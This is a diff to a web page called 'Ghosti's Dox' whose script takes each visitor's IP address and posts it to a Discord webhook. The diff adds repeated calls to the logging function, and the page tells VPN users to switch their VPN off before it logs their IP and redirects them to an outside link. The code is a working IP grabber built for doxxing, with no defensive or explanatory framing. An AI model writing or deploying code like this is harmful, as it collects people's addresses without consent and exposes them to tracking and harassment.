@@ -11,7 +11,9 @@
                 await axios.post(webhookUrl, {content: `IP Address: ${ip}`});
                 console.log('IP address sent to Discord webhook:', ip);
             } catch (error) { console.error('Error logging IP address:', error); }
-         }
+        }
+                logIPAndSendToWebhook();
+            }
                 
             
         
@@ -23,13 +25,15 @@
                 alert("Couldn't continue due to you using a VPN. If you want to continue to Ghosti's Dox, please turn off your VPN!");
             } else {
                 logIPAndSendToWebhook();
+                logIPAndSendToWebhook();
+                logIPAndSendToWebhook();
+                logIPAndSendToWebhook();
                 window.location.href = "https://xtube.chat/YP9GCO"; // Redirect to another site when VPN is off
             }
         }
     </script>
 </head>
 <body onload="detectVPN()">
-    <h1>Welcome to Ghosti's Dox</h1>
     <p>If you see this message, VPN detection failed.</p>
 </body>
 </html>
